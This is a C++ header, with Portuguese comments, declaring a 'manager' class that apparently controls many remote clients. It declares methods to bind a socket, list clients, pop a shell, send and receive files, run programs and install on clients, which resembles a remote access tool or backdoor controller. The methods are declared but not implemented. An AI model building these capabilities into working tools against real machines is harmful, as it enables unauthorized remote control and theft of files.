
#include <string>
#include <python3.8/Python.h>
#include "pyhelper.hpp"
#include <vector>

#define ALL     0

using namespace std;


class manager
{
private:
    /* data */

    void //retornar que funcionou?
    CreateBindSocket();

public:
    manager(/* args */);
    ~manager();

    void
    Help(string comando);

    vector <string>
    FrontListClients();

    void //retornar que funcionou?
    FrontPopShell(unsigned idClient = ALL); // (client) passo por qual referencia?

    void //retornar que funcionou?
    FrontSendFile(string fname, unsigned idClient = ALL); // passo o nome do arquivo? e o path dele?

    void //retornar que funcionou?
    FrontReciveFile(string fname, unsigned idClient = ALL);

    void //retornar que funcionou?
    FrontExecProgram(string programName, unsigned idCliente = ALL);

    void //retornar que funcionou?
    FrontInstall(unsigned idCliente = ALL);

};


